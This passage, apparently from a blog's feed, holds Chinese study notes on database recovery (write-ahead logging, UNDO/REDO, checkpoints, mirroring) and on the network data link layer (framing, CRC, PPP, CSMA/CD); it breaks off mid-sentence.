登记日志文件&#xD;</h3><p>为保证数据库是可恢复的，登记日志文件时必须遵循两条原则：</p><ol><li>登记的次序严格按并行事务执行的时间次序</li><li>必须先写日志文件，后写数据库<ul><li>写日志文件操作：把表示这个修改的日志记录写到日志文件</li><li>写数据库操作：把对数据的修改写到数据库中</li></ul></li></ol><p>为什么要先写日志文件？</p><p>写数据库和写日志文件是两个不同的操作，在这两个操作之间可能发生故障。</p><p>如果先写了数据库修改，而在日志文件中没有登记下这个修改，则以后就无法恢复这个修改了。如果先写日志，但没有修改数据库，按日志文件恢复时只不过是多执行一次不必要的UNDO操作，并不会影响数据库的正确性。</p><hr><h1 id="5-恢复策略"><a href="#5-恢复策略" class="headerlink" title="5 恢复策略"></a>5 恢复策略</h1><h2 id="5-1-事务故障的恢复"><a href="#5-1-事务故障的恢复" class="headerlink" title="5.1 事务故障的恢复"></a>5.1 事务故障的恢复</h2><p><strong>事务故障</strong>：事务在运行至正常终止点前被终止，由恢复子系统应利用日志文件撤消（UNDO）此事务已对数据库进行的修改。</p><p>事务故障的恢复由系统<strong>自动</strong>完成，对用户是透明的，不需要用户干预。</p><h3 id="5-1-1-事务故障的恢复步骤-xD"><a href="#5-1-1-事务故障的恢复步骤-xD" class="headerlink" title="5.1.1 事务故障的恢复步骤&#xD;"></a>5.1.1 事务故障的恢复步骤&#xD;</h3><ol><li>反向扫描文件日志（即从最后向前扫描日志文件），查找该事务的更新操作。</li><li>对该事务的更新操作执行逆操作。即将日志记录中“更新前的值” 写入数据库。<ul><li><p>插入操作， “更新前的值”为空，则相当于做删除操作</p></li><li><p>删除操作，“更新后的值”为空，则相当于做插入操作</p></li><li><p>若是修改操作，则相当于用修改前值代替修改后值</p></li></ul></li><li>继续反向扫描日志文件，查找该事务的其他更新操作，并做同样处理。</li><li>如此处理下去，直至读到此事务的开始标记，事务故障恢复就完成了。</li></ol><h2 id="5-2-系统故障的恢复"><a href="#5-2-系统故障的恢复" class="headerlink" title="5.2 系统故障的恢复"></a>5.2 系统故障的恢复</h2><p>系统故障造成数据库不一致状态的原因</p><ol><li>未完成事务对数据库的更新已写入数据库—<strong>Undo 故障发生时未完成的事务</strong></li><li>已提交事务对数据库的更新还留在缓冲区没来得及写入数据库—<strong>Redo 已完成的事务</strong></li></ol><p>系统故障的恢复是由系统在重新启动时自动完成的，不需要用户干预，恢复步骤是：</p><ol><li>正向扫描日志文件（即从头扫描日志文件）<ul><li>重做（REDO）队列：在故障发生前已经提交的事务，这些事务既有BEGIN TRANSACTION记录，也有COMMIT记录</li><li>撤销（Undo）队列：故障发生时尚未完成的事务，这些事务只有BEGIN TRANSACTION记录，无相应的COMMIT记录</li></ul></li><li>对撤销（Undo）队列事务进行撤销（UNDO）处理<ul><li>反向扫描日志文件，对每个UNDO事务的更新操作执行逆操作</li></ul></li><li>对重做（Redo）队列事务进行重做（REDO）处理<ul><li>正向扫描日志文件，对每个REDO事务重新执行登记的操作</li></ul></li></ol><h2 id="5-3-介质故障的恢复"><a href="#5-3-介质故障的恢复" class="headerlink" title="5.3 介质故障的恢复"></a>5.3 介质故障的恢复</h2><p>发生介质故障后，磁盘上的物理数据和日志文件被破坏，这是最严重的一种故障，恢复方法是重装数据库，然后重做已完成的事务。</p><ol><li>装入最新的后备数据库副本（离故障发生时刻最近的转储副本），使数据库恢复到最近一次转储时的一致性状态。<ul><li>对于静态转储的数据库副本，装入后数据库即处于一致性状态</li><li>对于动态转储的数据库副本，还须同时装入转储时刻的日志文件副本，利用与恢复系统故障的方法（即REDO+UNDO），才能将数据库恢复到一致性状态。</li></ul></li><li>装入有关的日志文件副本（转储结束时刻的日志文件副本) ，重做已完成的事务。<ul><li>首先扫描日志文件，找出故障发生时已提交的事务的标识，将其记入重做队列。</li><li>然后正向扫描日志文件，对重做队列中的所有事务进行重做处理。即将日志记录中“更新后的值”写入数据库。</li></ul></li></ol><p>介质故障的恢复需要DBA（数据库管理员）介入，DBA的工作：</p><ol><li>重装最近转储的数据库副本和有关的各日志文件副本</li><li>执行系统提供的恢复命令</li></ol><p>具体的恢复操作仍由DBMS完成。</p><hr><h1 id="6-具有检查点的恢复技术"><a href="#6-具有检查点的恢复技术" class="headerlink" title="6 具有检查点的恢复技术"></a>6 具有检查点的恢复技术</h1><p>一般来说使用日志技术进行数据库恢复时，需要检查所有日志记录，这样做有两个问题：</p><ol><li>搜索整个日志将耗费大量的时间</li><li>REDO处理：重新执行，浪费了大量时间</li></ol><p>引入检查点（checkpoint）记录，增加一个重新开始文件，并让恢复子系统在登录日志文件期间动态地维护日志。</p><p>检查点记录的内容：</p><ol><li>建立检查点时刻所有正在执行的事务清单</li><li>这些事务最近一个日志记录的地址</li></ol><p>重新开始文件用来记录记录各个检查点记录在日志文件中的地址。</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_GNSS4zbloj.png"></p><p>动态维护日志文件的方法是周期性地执行如下操作：建立检查点，保存数据库状态。具体步骤是：</p><ol><li>将当前日志缓冲区中的所有日志记录写入磁盘的日志文件上</li><li>在日志文件中写入一个检查点记录</li><li>将当前数据缓冲区的所有数据记录写入磁盘的数据库中</li><li>把检查点记录在日志文件中的地址写入一个重新开始文件</li></ol><p>恢复子系统可以定期或不定期地建立检查点，保存数据库状态，按照预定的一个时间间隔，如每隔一小时建立一个检查点，也可以按照某种规则，如日志文件已写满一半建立一个检查点。</p><p>使用检查点方法可以改善恢复效率，当事务T在一个检查点之前提交，T对数据库所做的修改已写入数据库，写入时间是在这个检查点建立之前或在这个检查点建立之时，在进行恢复处理时，没有必要对事务T执行REDO操作。</p><p>系统出现故障时，恢复子系统将根据事务的不同状态采取不同的恢复策略：</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_MefizAZwwA.png"></p><ul><li><p>T1：在检查点之前提交</p></li><li><p>T2：在检查点之前开始执行，在检查点之后故障点之前提交</p></li><li><p>T3：在检查点之前开始执行，在故障点时还未完成</p></li><li><p>T4：在检查点之后开始执行，在故障点之前提交</p></li><li><p>T5：在检查点之后开始执行，在故障点时还未完成</p></li></ul><p>恢复策略：</p><ul><li><p>T3和T5在故障发生时还未完成，所以予以撤销</p></li><li><p>T2和T4在检查点之后才提交，它们对数据库所做的修改在故障发生时可能还在缓冲区中，尚未写入数据库，所以要REDO</p></li><li><p>T1在检查点之前已提交，所以不必执行REDO操作</p></li></ul><h2 id="6-1-利用检查点的恢复步骤"><a href="#6-1-利用检查点的恢复步骤" class="headerlink" title="6.1 利用检查点的恢复步骤"></a>6.1 利用检查点的恢复步骤</h2><p>（1）从重新开始文件中找到最后一个检查点记录在日志文件中的地址，由该地址在日志文件中找到最后一个检查点记录。</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_pkwlZJ9kC4.png"></p><p>（2）由该检查点记录得到检查点建立时刻所有正在执行的事务清单ACTIVE-LIST</p><p>这里建立两个事务队列：</p><ol><li>UNDO-LIST</li><li>REDO-LIST</li></ol><p>把ACTIVE-LIST暂时放入UNDO-LIST队列，REDO队列暂为空。</p><p>（3）从检查点开始正向扫描日志文件，直到日志文件结束。</p><ul><li><p>如有新开始的事务Ti，把Ti暂时放入UNDO-LIST队列</p></li><li><p>如有提交的事务Tj，把Tj从UNDO-LIST队列移到REDO-LIST队列</p></li></ul><p>（4）对UNDO-LIST中的每个事务执行UNDO操作，对REDO-LIST中的每个事务执行REDO操作。</p><hr><h1 id="7-数据库镜像"><a href="#7-数据库镜像" class="headerlink" title="7 数据库镜像"></a>7 数据库镜像</h1><p>介质故障是对系统影响最为严重的一种故障，严重影响数据库的可用性，介质故障恢复比较费时。</p><p>为预防介质故障，DBA必须周期性地转储数据库，提高数据库可用性的解决方案：数据库镜像（Mirror）。</p><p>DBMS自动把整个数据库或其中的关键数据复制到另一个磁盘上，DBMS自动保证镜像数据与主数据库的一致性，每当主数据库更新时，DBMS自动把更新后的数据复制过去（如下图所示）。</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_16qaSKqGuh.png"></p><p>出现介质故障时可由镜像磁盘继续提供使用 ，同时DBMS自动利用镜像磁盘数据进行数据库的恢复，不需要关闭系统和重装数据库副本（如下图所示）。</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_cHoxXxX6_X.png"></p><p>在没有出现故障时，数据库镜像还可以用于并发操作，即当一个用户对数据加排他锁修改数据时，其他用户据可以读镜像数据库上的数据，而不必等待该用户释放锁。</p><p>频繁地复制数据自然会降低系统运行效率，因此在实际应用中用户往往只选择对关键数据和日志文件镜像，而不是对整个数据库进行镜像。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第3章：数据链路层</title>
      <link href="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="1-使用点对点信道的数据链路层"><a href="#1-使用点对点信道的数据链路层" class="headerlink" title="1 使用点对点信道的数据链路层"></a>1 使用点对点信道的数据链路层</h1><p>数据链路层使用的信道主要有以下两种类型：</p><ul><li><p>点对点信道。这种信道使用一对一的点对点通信方式。</p></li><li><p>广播信道。这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。&#x20;</p></li></ul><p>数据链路层的简单模型，主机 H1 向 H2 发送数据</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_Xqi4Ph8ZFU.png"></p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_qIxE4qJVaD.png"></p><h2 id="1-1-数据链路和帧"><a href="#1-1-数据链路和帧" class="headerlink" title="1.1 数据链路和帧"></a>1.1 数据链路和帧</h2><p><strong>链路</strong>（link）是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。</p><ul><li>一条链路只是一条通路的一个组成部分</li></ul><p><strong>数据链路</strong>（data link）除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。</p><ul><li>现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。</li><li>一般的适配器都包括了数据链路层和物理层这两层的功能。</li></ul><hr><h1 id="2-数据链路层的-3H-问题"><a href="#2-数据链路层的-3H-问题" class="headerlink" title="2 数据链路层的 3H 问题"></a>2 数据链路层的 3H 问题</h1><ol><li>How to 封装成帧</li><li>How to 透明传输</li><li>How to 差错控制</li></ol><h2 id="2-1-封装成帧"><a href="#2-1-封装成帧" class="headerlink" title="2.1 封装成帧"></a>2.1 封装成帧</h2><ul><li>封装成帧(framing)就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。</li><li>首部和尾部的一个重要作用就是进行帧定界。</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_z70mHqpAqD.png"></p><h2 id="2-2-透明传输（屏蔽边界符）"><a href="#2-2-透明传输（屏蔽边界符）" class="headerlink" title="2.2 透明传输（屏蔽边界符）"></a>2.2 透明传输（屏蔽边界符）</h2><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_cGlwHudDhI.png"></p><ol><li><strong>规则1</strong>：发送端的数据链路层在数据中如果出现了边界控制字符“SOH”或“EOT”，则在其前面插入一个转义字符“ESC”(其十六进制编码是 1B)。</li><li><strong>规则2</strong>：<strong>字节填充</strong>(byte stuffing)或<strong>字符填充</strong>(character stuffing）接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。</li><li><strong>规则3</strong>：如果转义字符也出现数据当中，那么应在转义字符前面再插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。&#x20;</li></ol><ul><li>用字节填充法解决透明传输问题</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_dSyYis-LrJ.png"></p><h2 id="2-3-差错检测"><a href="#2-3-差错检测" class="headerlink" title="2.3 差错检测"></a>2.3 差错检测</h2><p>在传输过程中可能会产生比特差错：1 可能会变成 0，而 0 也可能变成 1。在一段时间内，传输错误的比特占所传输比特总数的比率称为<strong>误码率 BER</strong> (Bit Error Rate)。</p><p>误码率与信噪比有很大的关系。为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。</p><h3 id="2-3-1-循环冗余检验"><a href="#2-3-1-循环冗余检验" class="headerlink" title="2.3.1 循环冗余检验"></a>2.3.1 循环冗余检验</h3><p>在数据链路层传送的帧中，广泛使用了循环冗余检验 CRC 的检错技术。</p><ul><li>在发送端，先把数据划分为组，假定每组 k 个比特。&#x20;</li><li>假设待传送的一组数据为 M &#x3D; 101001（则 k &#x3D; 6），那么在 M 的后面再添加供差错检测用的 n 位冗余码一起发送。</li></ul><p>接收端对收到的每一帧进行 CRC 检验：</p><ol><li>若得出的余数 R &#x3D; 0，则判定这个帧没有差错，就接收。</li><li>若余数 R ≠ 0，则判定这个帧有差错，就丢弃。</li></ol><p>但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。&#x20;</p><h3 id="2-3-2-冗余码的计算-xD"><a href="#2-3-2-冗余码的计算-xD" class="headerlink" title="2.3.2 冗余码的计算 &#xD;"></a>2.3.2 冗余码的计算 &#xD;</h3><p>用二进制的模 2 运算进行 $2^n $ 乘 M 的运算，这相当于在 M 后面添加 n 个 0。</p><p>得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少1 位，即 R 是 n 位。&#x20;</p><h3 id="2-3-3-冗余码的计算举例-xD"><a href="#2-3-3-冗余码的计算举例-xD" class="headerlink" title="2.3.3 冗余码的计算举例 &#xD;"></a>2.3.3 冗余码的计算举例 &#xD;</h3><p>现在 k &#x3D; 6, 即 M &#x3D; 101001。设 n &#x3D; 3, 除数 P &#x3D; 1101，被除数是 2nM &#x3D; 101001000。&#x20;</p><p>模 2 运算的结果是：商 Q &#x3D; 110101，余数 R &#x3D; 001。</p><p>把余数 R 作为冗余码添加在数据 M 的后面发送出去。发送的数据是：2nM + R ,  即：101001001，共 (k + n) 位。&#x20;</p><ul><li>循环冗余检验的原理说明&#x20;</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_oJnGODwCvR.png"></p><h3 id="2-3-4-帧检验序列-FCS-xD"><a href="#2-3-4-帧检验序列-FCS-xD" class="headerlink" title="2.3.4 帧检验序列 FCS &#xD;"></a>2.3.4 帧检验序列 FCS &#xD;</h3><p>在数据后面添加上的冗余码称为帧检验序列 FCS (Frame Check Sequence)。</p><p>循环冗余检验 CRC 和帧检验序列 FCS并不等同。</p><ul><li>CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。</li><li>FCS 可以用 CRC 这种方法得出，但 CRC 并非用来获得 FCS 的唯一方法。</li></ul><p>仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受。“无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。</p><p>也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃不接受）。要做到“可靠传输”（即发送什么就收到什么）就必须再加上确认和重传机制。 &#x20;</p><hr><h1 id="3-点对点协议-PPP"><a href="#3-点对点协议-PPP" class="headerlink" title="3 点对点协议 PPP"></a>3 点对点协议 PPP</h1><h2 id="3-1-PPP-协议的特点"><a href="#3-1-PPP-协议的特点" class="headerlink" title="3.1 PPP 协议的特点"></a>3.1 PPP 协议的特点</h2><ul><li>现在全世界使用得最多的数据链路层协议是点对点协议 PPP (Point-to-Point Protocol)。</li><li>固定用户使用电话线接入因特网时，一般都是使用 PPP 协议。 &#x20;</li></ul><p>用户到 ISP 的链路使用 PPP 协议：</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_AsfkAi5RWy.png"></p><h2 id="3-2-PPP-协议的组成"><a href="#3-2-PPP-协议的组成" class="headerlink" title="3.2 PPP 协议的组成"></a>3.2 PPP 协议的组成</h2><p>1992 年制订了 PPP 协议。经过 1993 年和 1994 年的修订，现在的 PPP 协议已成为因特网的正式标准[RFC 1661]。</p><p>PPP 协议有三个组成部分：</p><ol><li>一个将 IP 数据报封装到串行链路的方法。</li><li>链路控制协议 LCP (Link Control Protocol)。</li><li>网络控制协议 NCP (Network Control Protocol)。</li></ol><h2 id="3-3-PPP-协议的帧格式"><a href="#3-3-PPP-协议的帧格式" class="headerlink" title="3.3 PPP 协议的帧格式"></a>3.3 PPP 协议的帧格式</h2><ul><li>标志字段 F &#x3D; 0x7E （符号“0x”表示后面的字符是用十六进制表示。十六进制的 7E 的二进制表示是 01111110）。</li><li>地址字段 A 只置为 0xFF。地址字段实际上并不起作用。</li><li>控制字段 C 通常置为 0x03。</li></ul><p>PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_zt54ChAetL.png"></p><p>PPP 有一个 2 个字节的协议字段。</p><ul><li>当协议字段为 0x0021 时，PPP 帧的信息字段就是IP 数据报。</li><li>若为 0xC021, 则信息字段是 PPP 链路控制数据。</li><li>若为 0x8021，则表示这是网络控制数据。&#x20;</li></ul><h2 id="3-4-透明传输问题"><a href="#3-4-透明传输问题" class="headerlink" title="3.4 透明传输问题"></a>3.4 透明传输问题</h2><ul><li>当 PPP 用在<strong>同步传输</strong>链路时，协议规定采用硬件来完成比特填充（和 HDLC 的做法一样）。</li><li>当 PPP 用在<strong>异步传输</strong>时，就使用一种特殊的字符填充法。&#x20;</li></ul><h3 id="3-4-1-字符填充-xD"><a href="#3-4-1-字符填充-xD" class="headerlink" title="3.4.1 字符填充 &#xD;"></a>3.4.1 字符填充 &#xD;</h3><p>将信息字段中出现的每一个 0x7E 字节转变成为 2 字节序列(0x7D, 0x5E)。 若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列(0x7D, 0x5D)。</p><p>若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。 &#x20;</p><h3 id="3-4-2-零比特填充-xD"><a href="#3-4-2-零比特填充-xD" class="headerlink" title="3.4.2 零比特填充 &#xD;"></a>3.4.2 零比特填充 &#xD;</h3><p>PPP 协议用在 SONET&#x2F;SDH 链路时，是使用同步传输（一连串的比特连续传送）。这时 PPP 协议采用零比特填充方法来实现透明传输。</p><p>在发送端，只要发现有 5 个连续 1，则立即填入一个 0。接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的一个 0 删除，</p><ul><li>信息字段中出现了和标志字段 F 完全一样的 8 比特组合</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_XFB6BoYwC0.png"></p><ul><li>发送端在 5 个连 1 之后填入 0 比特再发送出去</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_8qZn2a3UAy.png"></p><ul><li>在接收端把 5 个连 1之后的 0 比特删除</li></ul><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_AsxVviFXn1.png"></p><h2 id="3-5-不提供使用序号和确认的可靠传输-x20"><a href="#3-5-不提供使用序号和确认的可靠传输-x20" class="headerlink" title="3.5 不提供使用序号和确认的可靠传输&#x20;"></a>3.5 不提供使用序号和确认的可靠传输&#x20;</h2><p>PPP 协议之所以不使用序号和确认机制是出于以下的考虑：</p><ol><li>在数据链路层出现差错的概率不大时，使用比较简单的 PPP 协议较为合理。</li><li>在因特网环境下，PPP 的信息字段放入的数据是 IP 数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。</li><li>帧检验序列 FCS 字段可保证无差错接受。</li></ol><h2 id="3-6-PPP-协议的工作状态"><a href="#3-6-PPP-协议的工作状态" class="headerlink" title="3.6 PPP 协议的工作状态"></a>3.6 PPP 协议的工作状态</h2><p>当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。</p><ul><li>PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。</li><li>这些分组及其响应选择一些 PPP 参数，和进行网络层配置，NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。</li><li>通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。</li></ul><hr><h1 id="4-使用广播信道的数据链路层"><a href="#4-使用广播信道的数据链路层" class="headerlink" title="4 使用广播信道的数据链路层"></a>4 使用广播信道的数据链路层</h1><h2 id="4-1-局域网的数据链路层"><a href="#4-1-局域网的数据链路层" class="headerlink" title="4.1 局域网的数据链路层"></a>4.1 局域网的数据链路层</h2><p>局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限。</p><p>局域网具有如下的一些主要优点：</p><ol><li>具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。</li><li>便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。</li><li>提高了系统的可靠性、可用性和残存性。</li></ol><h3 id="4-1-1-局域网的拓扑"><a href="#4-1-1-局域网的拓扑" class="headerlink" title="4.1.1 局域网的拓扑"></a>4.1.1 局域网的拓扑</h3><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image__Sbn1zagfA.png"></p><p>局域网工作的层次跨越了数据链路层和物理层。由于局域网技术中有关数据链路层的内容比较丰富，因此放在数据链路层进行讨论，但并不代表局域网仅与数据链路层有关。</p><h3 id="4-1-2-信道共享技术"><a href="#4-1-2-信道共享技术" class="headerlink" title="4.1.2 信道共享技术"></a>4.1.2 信道共享技术</h3><p>共享信道要考虑如何让众多用户能够合理而方便地共享通信媒体资源，通常有两种方法：</p><ol><li>静态划分信道：频分复用、时分复用、波分复用、码分复用</li><li>动态媒体接入控制（多点接入）<ul><li>随机接入，所有用户可随机发送信息。但如果恰巧有两个或更多的用户在同一时刻发送信息，就会在共享媒体上产生碰撞，使得这些用户的发送都失败，因此必须有解决碰撞的协议。</li><li>受控接入 ，如多点线路探询(polling)，或轮询。</li></ul></li></ol><h3 id="4-1-3-以太网的两个标准"><a href="#4-1-3-以太网的两个标准" class="headerlink" title="4.1.3 以太网的两个标准"></a>4.1.3 以太网的两个标准</h3><ol><li>DIX Ethernet V2 是世界上第一个局域网产品（以太网）的规约。</li><li>IEEE 的 802.3 标准。</li></ol><p>DIX Ethernet V2 标准与 IEEE 的 802.3 标准只有很小的差别，因此可以将 802.3 局域网简称为“以太网”。严格说来，“以太网”应当是指符合 DIX Ethernet V2 标准的局域网。</p><p>由于有很多不同的局域网标准，为了使数据链路层能更好地适应多种局域网标准，IEEE 802委员会就把局域网的数据链路层拆分魏两个子层：</p><ul><li>逻辑链路控制 LLC (Logical Link Control)子层</li><li>媒体接入控制 MAC (Medium Access Control)子层</li></ul><p>与接入到传输媒体有关的内容都放在 MAC子层，而 LLC 子层则与传输媒体无关，不管采用何种协议的局域网对 LLC 子层来说都是透明的。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_vu2eEg2juC.png"></p><p>由于 TCP&#x2F;IP 体系经常使用的局域网是 DIX Ethernet V2 而不是 802.3 标准中的几种局域网，因此现在 802 委员会制定的逻辑链路控制子层 LLC（即 802.2 标准）的作用已经不大了。</p><p>很多厂商生产的适配器上就仅装有 MAC 协议而没有 LLC 协议，所以以后一般不考虑LLC层。</p><h2 id="4-2-适配器的作用"><a href="#4-2-适配器的作用" class="headerlink" title="4.2 适配器的作用"></a>4.2 适配器的作用</h2><p>网络接口板又称为<strong>通信适配器</strong>（adapter）或<strong>网络接口卡</strong> NIC（Network Interface Card），或“网卡”。&#x20;</p><p>适配器的重要功能：</p><ol><li><strong>进行串行&#x2F;并行转换</strong>：适配器和局域网之间的通信是通过电缆或双绞线以串行传输方式进行的，但是适配器和计算机之间的通信是通过计算机主板上的I&#x2F;O总线以并行方式进行的。</li><li><strong>对数据进行缓存</strong>：网络上的数据率和计算机总线上的数据率并不相同。</li><li><strong>在计算机的操作系统安装设备驱动程序</strong>：驱动程序会告诉适配器，应当从存储器的什么位置把多长的数据块发送到局域网上，或者应该在存储器的什么位置把局域网上的数据块存储下来。</li><li><strong>实现以太网协议</strong></li></ol><p>当适配器收到有差错的帧时，直接丢弃而不用通知计算机。收到正确的帧时，通过中断通知该计算机，并交付协议栈中的网络层。</p><p>计算机的硬件地址就在适配器的ROM中，而软件地址—IP地址在计算机的存储器中。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_-YbHjUAamT.png"></p><h2 id="4-3-CSMA-CD协议"><a href="#4-3-CSMA-CD协议" class="headerlink" title="4.3 CSMA&#x2F;CD协议"></a>4.3 CSMA&#x2F;CD协议</h2><p>最初的以太网是将许多计算机都连接到一根总线上。当初认为这样的连接方法既简单又可靠，因为总线上没有有源器件。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_TiDycuvdsv.png"></p><p>以太网的广播方式发送，总线上的每一个工作的计算机都能检测到 B 发送的数据信号。由于只有计算机 D 的地址与数据帧首部写入的地址一致，因此只有 D 才接收这个数据帧。</p><p>其他所有的计算机（A, C 和 